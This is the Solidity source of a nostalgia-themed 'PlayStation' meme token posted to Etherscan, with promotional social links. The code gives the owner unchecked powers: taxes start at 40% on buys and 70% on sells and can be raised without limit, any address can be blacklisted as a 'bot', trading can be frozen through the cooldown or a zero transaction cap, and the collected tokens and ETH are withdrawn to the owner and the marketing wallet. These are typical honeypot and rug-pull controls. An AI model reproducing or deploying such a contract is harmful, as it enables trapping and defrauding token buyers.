1 /**
2  *Submitted for verification at Etherscan.io on 2023-08-22
3  */
4 /*
5 
6 Telegram: https://t.me/PlayStationFunToken_Eth
7 Website:  https://ps1.live
8 Twitter:  https://twitter.com/PS_EthNostalgia
9 
10  ################################
11  ||                            ||
12  ||        Play Station   
13  ||    FUN NOSTALGIC FEELING   ||
14  ||                            ||
15  ################################
16 */
17 
18 // SPDX-License-Identifier: Unlicense
19 
20 pragma solidity ^0.8.18;
21 
22 abstract contract Context {
23     function _msgSender() internal view virtual returns (address) {
24         return msg.sender;
25     }
26 }
27 
28 interface IERC20 {
29     function totalSupply() external view returns (uint256);
30 
31     function balanceOf(address account) external view returns (uint256);
32 
33     function transfer(address recipient, uint256 amount)
34         external
35         returns (bool);
36 
37     function allowance(address owner, address spender)
38         external
39         view
40         returns (uint256);
41 
42     function approve(address spender, uint256 amount) external returns (bool);
43 
44     function transferFrom(
45         address sender,
46         address recipient,
47         uint256 amount
48     ) external returns (bool);
49 
50     event Transfer(address indexed from, address indexed to, uint256 value);
51     event Approval(
52         address indexed owner,
53         address indexed spender,
54         uint256 value
55     );
56 }
57 
58 library SafeMath {
59     function add(uint256 a, uint256 b) internal pure returns (uint256) {
60         uint256 c = a + b;
61         require(c >= a, "SafeMath: addition overflow");
62         return c;
63     }
64 
65     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
66         return sub(a, b, "SafeMath: subtraction overflow");
67     }
68 
69     function sub(
70         uint256 a,
71         uint256 b,
72         string memory errorMessage
73     ) internal pure returns (uint256) {
74         require(b <= a, errorMessage);
75         uint256 c = a - b;
76         return c;
77     }
78 
79     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
80         if (a == 0) {
81             return 0;
82         }
83         uint256 c = a * b;
84         require(c / a == b, "SafeMath: multiplication overflow");
85         return c;
86     }
87 
88     function div(uint256 a, uint256 b) internal pure returns (uint256) {
89         return div(a, b, "SafeMath: division by zero");
90     }
91 
92     function div(
93         uint256 a,
94         uint256 b,
95         string memory errorMessage
96     ) internal pure returns (uint256) {
97         require(b > 0, errorMessage);
98         uint256 c = a / b;
99         return c;
100     }
101 }
102 
103 contract Ownable is Context {
104     address private _owner;
105     event OwnershipTransferred(
106         address indexed previousOwner,
107         address indexed newOwner
108     );
109 
110     constructor() {
111         address msgSender = _msgSender();
112         _owner = msgSender;
113         emit OwnershipTransferred(address(0), msgSender);
114     }
115 
116     function owner() public view returns (address) {
117         return _owner;
118     }
119 
120     modifier onlyOwner() {
121         require(_owner == _msgSender(), "Ownable: caller is not the owner");
122         _;
123     }
124 
125     function renounceOwnership() public virtual onlyOwner {
126         emit OwnershipTransferred(_owner, address(0));
127         _owner = address(0);
128     }
129 }
130 
131 interface IUniswapV2Factory {
132     function createPair(address tokenA, address tokenB)
133         external
134         returns (address pair);
135 }
136 
137 interface IUniswapV2Router02 {
138     function swapExactTokensForETHSupportingFeeOnTransferTokens(
139         uint256 amountIn,
140         uint256 amountOutMin,
141         address[] calldata path,
142         address to,
143         uint256 deadline
144     ) external;
145 
146     function factory() external pure returns (address);
147 
148     function WETH() external pure returns (address);
149 
150     function addLiquidityETH(
151         address token,
152         uint256 amountTokenDesired,
153         uint256 amountTokenMin,
154         uint256 amountETHMin,
155         address to,
156         uint256 deadline
157     )
158         external
159         payable
160         returns (
161             uint256 amountToken,
162             uint256 amountETH,
163             uint256 liquidity
164         );
165 }
166 
167 contract PlayStation is Context, IERC20, Ownable {
168     using SafeMath for uint256;
169     mapping(address => uint256) private _balances;
170     mapping(address => mapping(address => uint256)) private _allowances;
171     mapping(address => bool) private _isExcludedFromFee;
172     mapping(address => bool) private bots;
173     address payable public _marketingWallet;
174 
175     uint256 public buyTax = 40;
176     uint256 public sellTax = 70;
177     uint256 public _buyCount = 0;
178 
179     uint8 private constant _decimals = 18;
180     uint256 private constant _tTotal = 100000000 * 10**_decimals;
181     string private constant _name = "PlayStation Token";
182     string private constant _symbol = "PlayStation";
183     uint256 public _maxTxAmount = 1000000 * 10**_decimals;
184     uint256 public _maxWalletSize = 2000000 * 10**_decimals;
185     uint256 public tradingCoolDownPeriod;
186 
187     IUniswapV2Router02 public uniswapV2Router;
188     address public uniswapV2Pair;
189     bool public tradingOpen = false;
190     bool public swapEnabled = false;
191 
192     event MaxTxAmountUpdated(uint256 _maxTxAmount);
193 
194     constructor() {
195         _marketingWallet = payable(0x738642cabF9365C8343ed2a82AE29F0EC7f04344);
196         _balances[_msgSender()] = _tTotal;
197         _isExcludedFromFee[owner()] = true;
198         _isExcludedFromFee[address(this)] = true;
199         _isExcludedFromFee[_marketingWallet] = true;
200 
201         emit Transfer(address(0), _msgSender(), _tTotal);
202     }
203 
204     function name() public pure returns (string memory) {
205         return _name;
206     }
207 
208     function symbol() public pure returns (string memory) {
209         return _symbol;
210     }
211 
212     function decimals() public pure returns (uint8) {
213         return _decimals;
214     }
215 
216     function totalSupply() public pure override returns (uint256) {
217         return _tTotal;
218     }
219 
220     function balanceOf(address account) public view override returns (uint256) {
221         return _balances[account];
222     }
223 
224     function transfer(address recipient, uint256 amount)
225         public
226         override
227         returns (bool)
228     {
229         _transfer(_msgSender(), recipient, amount);
230         return true;
231     }
232 
233     function allowance(address owner, address spender)
234         public
235         view
236         override
237         returns (uint256)
238     {
239         return _allowances[owner][spender];
240     }
241 
242     function approve(address spender, uint256 amount)
243         public
244         override
245         returns (bool)
246     {
247         _approve(_msgSender(), spender, amount);
248         return true;
249     }
250 
251     function transferFrom(
252         address sender,
253         address recipient,
254         uint256 amount
255     ) public override returns (bool) {
256         _transfer(sender, recipient, amount);
257         _approve(
258             sender,
259             _msgSender(),
260             _allowances[sender][_msgSender()].sub(
261                 amount,
262                 "ERC20: transfer amount exceeds allowance"
263             )
264         );
265         return true;
266     }
267 
268     function _approve(
269         address owner,
270         address spender,
271         uint256 amount
272     ) private {
273         require(owner != address(0), "ERC20: approve from the zero address");
274         require(spender != address(0), "ERC20: approve to the zero address");
275         _allowances[owner][spender] = amount;
276         emit Approval(owner, spender, amount);
277     }
278 
279     function _transfer(
280         address from,
281         address to,
282         uint256 amount
283     ) private {
284         require(from != address(0), "ERC20: transfer from the zero address");
285         require(to != address(0), "ERC20: transfer to the zero address");
286         require(amount > 0, "Transfer amount must be greater than zero");
287         uint256 taxAmount = 0;
288         if (from != owner() && to != owner()) {
289             require(!bots[from] && !bots[to]);
290             if (from == uniswapV2Pair || to == uniswapV2Pair) {
291                 require(
292                     block.timestamp >= tradingCoolDownPeriod,
293                     "Trading is currently off"
294                 );
295             }
296 
297             if (
298                 from == uniswapV2Pair &&
299                 to != address(uniswapV2Router) &&
300                 !_isExcludedFromFee[to]
301             ) {
302                 require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
303                 require(
304                     balanceOf(to) + amount <= _maxWalletSize,
305                     "Exceeds the maxWalletSize."
306                 );
307 
308                 taxAmount = amount.mul(buyTax).div(100);
309                 _buyCount++;
310             } else if (
311                 to == uniswapV2Pair &&
312                 from != address(this) &&
313                 !_isExcludedFromFee[from]
314             ) {
315                 require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
316                 taxAmount = amount.mul(sellTax).div(100);
317             }
318         }
319 
320         if (taxAmount > 0) {
321             _balances[address(this)] = _balances[address(this)].add(taxAmount);
322             emit Transfer(from, address(this), taxAmount);
323         }
324 
325         _balances[from] = _balances[from].sub(amount);
326         _balances[to] = _balances[to].add(amount.sub(taxAmount));
327         emit Transfer(from, to, amount.sub(taxAmount));
328     }
329 
330     function swapTokensForEth(uint256 tokenAmount) private {
331         if (tokenAmount == 0) {
332             return;
333         }
334         if (!tradingOpen) {
335             return;
336         }
337         address[] memory path = new address[](2);
338         path[0] = address(this);
339         path[1] = uniswapV2Router.WETH();
340         _approve(address(this), address(uniswapV2Router), tokenAmount);
341         uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
342             tokenAmount,
343             0,
344             path,
345             address(this),
346             block.timestamp
347         );
348     }
349 
350     function setTradingCoolDown(uint256 _time) external onlyOwner {
351         tradingCoolDownPeriod = block.timestamp + _time;
352     }
353 
354     function removeLimits() external onlyOwner {
355         _maxTxAmount = _tTotal;
356         _maxWalletSize = _tTotal;
357         emit MaxTxAmountUpdated(_tTotal);
358     }
359 
360     function setMaxTxAmount(uint256 _amount) external onlyOwner {
361         _maxTxAmount = _amount;
362     }
363 
364     function setMaxWalletAmount(uint256 _amount) external onlyOwner {
365         _maxWalletSize = _amount;
366     }
367 
368     function sendETHToFee(uint256 amount) private {
369         _marketingWallet.transfer(amount);
370     }
371 
372     function setBuyTax(uint256 _tax) external onlyOwner {
373         buyTax = _tax;
374     }
375 
376     function setSellTax(uint256 _tax) external onlyOwner {
377         sellTax = _tax;
378     }
379 
380     function isBot(address a) public view returns (bool) {
381         return bots[a];
382     }
383 
384     // Function to add an address as a bot
385     function addBot(address botAddress) external onlyOwner {
386         bots[botAddress] = true;
387     }
388 
389     // Function to remove an address from the bot list
390     function removeBot(address botAddress) external onlyOwner {
391         bots[botAddress] = false;
392     }
393 
394     function setExcludedFromFee(address account) external onlyOwner {
395         require(!_isExcludedFromFee[account], "Account already excluded");
396         _isExcludedFromFee[account] = true;
397     }
398 
399     function removeExcludedFromFee(address account) external onlyOwner {
400         require(_isExcludedFromFee[account], "Account is not exlcuded");
401         _isExcludedFromFee[account] = false;
402     }
403 
404     function openTrading(address _lpPair, address _router) external onlyOwner {
405         require(!tradingOpen, "trading is already open");
406         uniswapV2Pair = _lpPair;
407         uniswapV2Router = IUniswapV2Router02(_router);
408         swapEnabled = true;
409         tradingOpen = true;
410     }
411 
412     receive() external payable {}
413 
414     function changeMarketingAddress(address _add) external onlyOwner {
415         _marketingWallet = payable(_add);
416     }
417 
418     function withDrawETH() external onlyOwner {
419         require(address(this).balance > 0, "Not enough eth");
420         payable(owner()).transfer(address(this).balance);
421     }
422 
423     function withdrawStuckTokens() external onlyOwner {
424         uint256 balance = balanceOf(address(this));
425         require(balance > 0, "No balance to withdraw");
426         _transfer(address(this), owner(), balance);
427     }
428 
429     function manualSwap() external {
430         require(_msgSender() == _marketingWallet);
431         uint256 tokenBalance = balanceOf(address(this));
432         if (tokenBalance > 0) {
433             swapTokensForEth(tokenBalance);
434         }
435         uint256 ethBalance = address(this).balance;
436         if (ethBalance > 0) {
437             sendETHToFee(ethBalance);
438         } else {
439             revert("Not enough value");
440         }
441     }
442 }